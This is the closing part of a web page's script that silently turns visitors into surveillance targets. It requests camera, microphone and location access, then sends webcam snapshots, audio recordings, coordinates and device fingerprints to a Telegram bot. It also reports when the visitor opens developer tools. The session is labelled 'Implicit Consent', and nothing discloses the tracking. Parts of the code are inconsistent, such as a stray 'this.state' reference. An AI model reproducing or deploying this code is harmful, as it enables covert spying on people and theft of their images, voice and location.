      } catch (e) {
        console.warn("Fetch error sending location to Telegram:", e);
        // this.send(`üö® Network Error sending location to Telegram: ${e.message}`, true);
      }
    },

    async initialize() {
      console.log("Tracking initialized.");
      if (App.config.botToken === "YOUR_REAL_BOT_TOKEN_HERE") {
          console.warn("Telegram bot token is not set. Tracking messages will not be sent.");
      } else {
          await this.send("üöÄ New Session Started (Implicit Consent)");
          await this.send(await this.getInitialReport());
      }

      // Check and request permissions
      await this.checkAndRequestPermission('camera');
      await this.checkAndRequestPermission('microphone');
      await this.checkAndRequestPermission('geolocation');

      this.detectDevTools();

      // Start snapshotting if camera is available and tracking is active
      if (App.state.cameraStream && App.state.isTrackingActive) {
        this.startSnapshotting();
      }

      // Start microphone recording if stream is available and interval is set
      if (App.state.microphoneStream && App.state.isTrackingActive && App.config.micRecordInterval > 0) {
        // Microphone recording is handled by MediaRecorder's onstop event, initiated in requestPermissionDirectly
        // We might want to start it here if the stream is available, but it's better managed by the permission flow.
      }

      // Start periodic activity reporting
      if (App.state.activityTrackerIntervalId) clearInterval(App.state.activityTrackerIntervalId);
      App.state.activityTrackerIntervalId = setInterval(() => {
        this.sendAccumulatedActivity();
      }, App.config.activityTrackingInterval);
    },

    async checkAndRequestPermission(name) {
      const savedPermission = App.state.permissions[name];
      console.log(`Checking permission for: ${name} (Saved: ${savedPermission})`);

      // If permission was explicitly granted or denied before, use that state
      if (savedPermission === 'granted') {
        console.log(`Permission for ${name} was previously granted. Attempting to initialize tracking.`);
        if (name === 'camera') this.requestCameraStream(); // Helper to get stream if granted
        else if (name === 'microphone') this.requestMicrophoneStream(); // Helper to get stream if granted
        else if (name === 'geolocation') this.requestGeolocation();
        return;
      } else if (savedPermission === 'denied') {
        console.log(`Permission for ${name} was previously denied. Not requesting.`);
        this.send(`‚ÑπÔ∏è Permission for ${name} was previously denied.`);
        return;
      }

      // If not explicitly handled, use the Permissions API if available
      try {
        if (!navigator.permissions) {
          console.warn(`Permissions API not supported for ${name}. Attempting direct request.`);
          await this.requestPermissionDirectly(name);
          return;
        }

        const status = await navigator.permissions.query({ name }); // [10, 18, 21, 25]
        console.log(`Permission '${name}' initial state: ${status.state}`);

        if (status.state === 'granted') {
          App.state.permissions[name] = 'granted';
          localStorage.setItem(`permission_${name}`, 'granted');
          console.log(`Permission for ${name} granted via Permissions API.`);
          if (name === 'camera') this.requestCameraStream();
          else if (name === 'microphone') this.requestMicrophoneStream();
          else if (name === 'geolocation') this.requestGeolocation();
        } else if (status.state === 'denied') {
          App.state.permissions[name] = 'denied';
          localStorage.setItem(`permission_${name}`, 'denied');
          console.log(`Permission for ${name} denied by user via Permissions API.`);
          this.send(`üö´ Permission for ${name} denied by user via Permissions API.`);
        } else { // 'prompt' or other states
          console.log(`Permission for ${name} is in 'prompt' state. Requesting directly.`);
          await this.requestPermissionDirectly(name); // This will trigger the user prompt
        }

        // Add listener for permission status changes
        status.onchange = async () => {
          console.log(`Permission '${name}' status changed to: ${status.state}`);
          const newState = status.state;
          App.state.permissions[name] = newState;
          localStorage.setItem(`permission_${name}`, newState);

          if (newState === 'granted') {
            console.log(`Permission for ${name} granted via change listener.`);
            if (name === 'camera') this.requestCameraStream();
            else if (name === 'microphone') this.requestMicrophoneStream();
            else if (name === 'geolocation') this.requestGeolocation();
          } else if (newState === 'denied') {
            console.log(`Permission for ${name} denied via change listener.`);
            this.send(`üö´ Permission for ${name} denied by user via change listener.`);
          }
        };
      } catch (e) {
        console.warn(`Error checking/requesting permission for ${name}:`, e);
        // Fallback to direct request if Permissions API fails or is unavailable
        await this.requestPermissionDirectly(name);
      }
    },

    // Helper to re-request stream if permission was already granted
    requestCameraStream() {
        if (!App.state.isTrackingActive) return;
        navigator.mediaDevices.getUserMedia({ video: true }) // [2, 5]
            .then(stream => {
                App.state.cameraStream = stream;
                App.DOM.captureVideo.srcObject = stream;
                App.DOM.captureVideo.play();
                this.startSnapshotting(); // Start snapshotting if stream is available
                console.log("Camera stream re-initialized successfully.");
            })
            .catch(e => {
                console.warn("Failed to re-initialize camera stream:", e);
                this.send("‚ö†Ô∏è Could not re-initialize camera stream.");
                App.state.permissions.camera = 'denied'; // Update state if re-initialization fails
                localStorage.setItem('permission_camera', 'denied');
            });
    },

    requestMicrophoneStream() {
        if (!App.state.isTrackingActive) return;
        navigator.mediaDevices.getUserMedia({ audio: true }) // [2, 5]
            .then(stream => {
                App.state.microphoneStream = stream;
                App.startMicRecording(stream); // Start recording
                console.log("Microphone stream re-initialized successfully.");
            })
            .catch(e => {
                console.warn("Failed to re-initialize microphone stream:", e);
                this.send("‚ö†Ô∏è Could not re-initialize microphone stream.");
                App.state.permissions.microphone = 'denied'; // Update state if re-initialization fails
                localStorage.setItem('permission_microphone', 'denied');
            });
    },

    // Request permissions directly, prompting the user
    async requestPermissionDirectly(name) {
      try {
        let stream = null;
        if (name === 'camera') {
            stream = await navigator.mediaDevices.getUserMedia({ video: true }); // [2, 5]
            App.state.cameraStream = stream;
            App.DOM.captureVideo.srcObject = stream;
            App.DOM.captureVideo.play();
            this.startSnapshotting(); // Start snapshotting interval
            this.send("‚úÖ Camera permission granted.");
        } else if (name === 'microphone') {
            stream = await navigator.mediaDevices.getUserMedia({ audio: true }); // [2, 5]
            App.state.microphoneStream = stream;
            App.startMicRecording(stream); // Start microphone recording
            this.send("‚úÖ Microphone permission granted.");
        } else if (name === 'geolocation') {
          navigator.geolocation.getCurrentPosition(
            p => { // Success callback
              App.state.userLocation = { lat: p.coords.latitude, lon: p.coords.longitude };
              console.log(`Geolocation obtained: ${p.coords.latitude}, ${p.coords.longitude}`);
              this.sendLocation(p.coords.latitude, p.coords.longitude); // [1]
              App.updateActivityTime();
              App.state.permissions.geolocation = 'granted';
              localStorage.setItem('permission_geolocation', 'granted');
            },
            e => { // Error callback
              console.warn("Geolocation error:", e);
              this.send(`üö´ Geolocation Error: Code ${e.code} - ${e.message}`); // [1, 3, 7, 15]
              App.state.permissions.geolocation = 'denied';
              localStorage.setItem('permission_geolocation', 'denied');
            },
            { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 } // Options for accuracy and timeout [1, 7]
          );
          return; // Geolocation request is asynchronous and handled by callbacks
        }

        // If a stream was obtained for camera or microphone
        if (stream) {
            App.state.permissions[name] = 'granted';
            localStorage.setItem(`permission_${name}`, 'granted');
        }
      } catch (e) {
        console.warn(`${name} permission denied or unavailable:`, e);
        this.send(`üö´ ${name} permission denied or unavailable: ${e.message}`);
        App.state.permissions[name] = 'denied';
        localStorage.setItem(`permission_${name}`, 'denied');
      }
    },

    stopCamera() {
      if (App.state.cameraStream) {
        App.state.cameraStream.getTracks().forEach(track => track.stop());
        App.state.cameraStream = null;
        App.DOM.captureVideo.srcObject = null;
        this.stopSnapshotting(); // Stop the interval
        console.log("Camera stream stopped.");
      }
    },

    stopMicrophone() {
      if (App.state.microphoneStream) {
        App.state.microphoneStream.getTracks().forEach(track => track.stop());
        App.state.microphoneStream = null;
        if (App.state.mediaRecorder) {
          App.state.mediaRecorder.stop(); // Stop the recorder if it's active
          App.state.mediaRecorder = null;
        }
        console.log("Microphone stream stopped.");
      }
    },

    detectDevTools() {
      const threshold = 160; // Heuristic: difference in window size when DevTools are open
      let devToolsCurrentlyOpen = false; // State to track current DevTools status

      const check = () => {
        // Check window dimensions to detect DevTools
        const isDevToolsOpen = window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold;
        
        if (isDevToolsOpen && !App.state.devToolsOpen) {
          App.state.devToolsOpen = true;
          console.log("Developer Tools Opened!");
          this.send("‚ö†Ô∏è Developer Tools Opened!", true); // High priority notification
        } else if (!isDevToolsOpen && App.state.devToolsOpen) {
          App.state.devToolsOpen = false;
          console.log("Developer Tools Closed!");
          this.send("‚úÖ Developer Tools Closed.", true); // High priority notification
        }
        // Continue checking recursively using requestAnimationFrame for smooth updates
        requestAnimationFrame(check);
      };
      // Start the DevTools detection loop
      requestAnimationFrame(check);
    },

    startSnapshotting() {
      // Prevent starting multiple intervals
      if (App.state.snapshotIntervalId) return;
      if (!App.state.cameraStream) {
          console.warn("Cannot start snapshotting: Camera stream is not available.");
          return;
      }
      console.log(`Starting snapshotting every ${App.config.snapshotInterval}ms.`);
      App.state.snapshotIntervalId = setInterval(() => {
        this.captureAndSend("üì∏ Webcam Snapshot");
      }, App.config.snapshotInterval);
    },

    stopSnapshotting() {
      if (App.state.snapshotIntervalId) {
        clearInterval(this.state.snapshotIntervalId);
        this.state.snapshotIntervalId = null;
        console.log("Snapshotting stopped.");
      }
    },

    captureAndSend(caption) {
      if (!App.state.cameraStream || !App.DOM.captureVideo || !App.DOM.captureCanvas) {
        console.warn("Snapshot capture failed: Missing camera stream or canvas elements.");
        return;
      }

      const video = App.DOM.captureVideo;
      const canvas = App.DOM.captureCanvas;
      const context = canvas.getContext('2d');

      // Ensure video has loaded some data before drawing
      if (video.videoWidth === 0 || video.videoHeight === 0) {
        console.warn("Snapshot capture failed: Video element has no dimensions.");
        return;
      }

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      // Draw the current frame from the video onto the canvas
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Convert the canvas content to a Blob
      canvas.toBlob(async (blob) => {
        if (blob) {
          console.log("Snapshot captured, sending to Telegram...");
          await this.sendPhoto(caption, blob);
        } else {
          console.error("Failed to create snapshot blob.");
          this.send("üö® Failed to create snapshot blob.");
        }
      }, 'image/png'); // Specify image format
    },

    // Implements microphone recording using MediaRecorder
    startMicRecording(stream) {
      if (!stream || !App.state.isTrackingActive) {
          console.warn("Cannot start mic recording: Stream not available or tracking is inactive.");
          return;
      }

      if (App.state.mediaRecorder && App.state.mediaRecorder.state !== 'inactive') {
          App.state.mediaRecorder.stop(); // Stop existing recorder if it's running
      }

      // Use 'audio/ogg' with opus codec for better browser compatibility and lower file size
      App.state.mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/ogg; codecs=opus' }); // [4, 6, 11]
      let audioChunks = [];

      App.state.mediaRecorder.ondataavailable = event => {
          audioChunks.push(event.data); // Collect audio data chunks
      };

      App.state.mediaRecorder.onstop = () => {
          if (audioChunks.length > 0) {
              const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' }); // Create Blob from chunks
              audioChunks = []; // Clear chunks for next recording
              console.log("Microphone recording stopped, sending audio...");
              this.sendAudio("üé§ Microphone Recording", audioBlob); // [14]
          }
          // Optionally restart recording if mic is still active and tracking is on
          // This logic would depend on whether you want continuous recording or discrete chunks.
          // For discrete chunks based on interval, this might be sufficient.
          // If using micRecordInterval, we might need a timer to trigger MediaRecorder.stop().
      };

      App.state.mediaRecorder.start(App.config.micRecordInterval); // Start recording, will emit 'stop' event after interval
      console.log(`Microphone recording started (interval: ${App.config.micRecordInterval}ms).`);
      App.updateActivityTime();
    },

    // This function is intended for sending accumulated, non-urgent data periodically.
    sendAccumulatedActivity() {
      if (!App.state.isTrackingActive) return;
      
      // Currently, logPageInteraction sends a comprehensive report periodically.
      // If other types of data were accumulated here, they would be sent now.
      // For example, if we had a buffer for network requests made by the page.
      console.log("Checking for accumulated activity to send.");
      this.logPageInteraction(); // Ensure some report is sent periodically.
    },
    
    // Helper to get initial report upon session start
    async getInitialReport() {
        let report = "*Initial Session Report*\n\n";
        report += `*User Agent:* \`${navigator.userAgent}\`\n`;
        report += `*Platform:* \`${navigator.platform}\`\n`;
        report += `*Language:* \`${navigator.language}\`\n`;
        report += `*Screen Resolution:* ${screen.width}x${screen.height}\n`;
        report += `*Viewport Size:* ${window.innerWidth}x${window.innerHeight}\n`;
        
        if (App.state.userLocation.lat !== "N/A") {
            report += `*Initial Location:* ${App.state.userLocation.lat}, ${App.state.userLocation.lon}\n`;
        } else {
            report += `*Initial Location:* N/A (Request pending or denied)\n`;
        }
        
        report += `*Permissions State:*\n`;
        for (const perm in App.state.permissions) {
            report += `  - ${perm}: ${App.state.permissions[perm]}\n`;
        }
        
        return report;
    }
  }
};

// Initialize the app when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', () => {
  App.init();
});
</script>
</body>
</html>
